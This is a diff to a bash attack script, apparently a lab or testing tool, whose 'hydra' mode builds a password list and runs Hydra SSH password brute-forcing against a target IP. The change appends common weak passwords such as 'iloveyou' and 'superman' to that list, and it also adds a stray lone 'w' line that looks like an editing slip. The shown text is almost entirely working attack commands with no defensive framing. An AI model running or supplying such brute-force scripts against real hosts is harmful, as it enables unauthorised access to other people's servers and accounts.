@@ -156,7 +156,7 @@ echo ""[*] TARGET: $TARGET_IP""
 echo ""[*] DURATION: $DURATION sec""
 echo ""[*] MODE: $MODE_ARG""
 echo ""------------------------------------------""
-
+w
 if [ ""$MODE_ARG"" = ""hydra"" ]; then
     # --- Hydra SSH Crack ---
     echo ""[*] Starting Hydra SSH Password Cracking...""
@@ -168,6 +168,12 @@ if [ ""$MODE_ARG"" = ""hydra"" ]; then
     echo ""admin"" >> passlist.txt
     echo ""root"" >> passlist.txt
     echo ""kali"" >> passlist.txt
+    echo ""iloveyou"" >> passlist.txt
+    echo ""killyou"" >> passlist.txt
+    echo ""iloveu"" >> passlist.txt
+    echo ""secret"" >> passlist.txt
+    echo ""pretty"" >> passlist.txt
+    echo ""superman"" >> passlist.txt
     
     # Hydra実行
     hydra -l $SSH_USER -P passlist.txt ssh://$TARGET_IP -t 4 -V -e ns
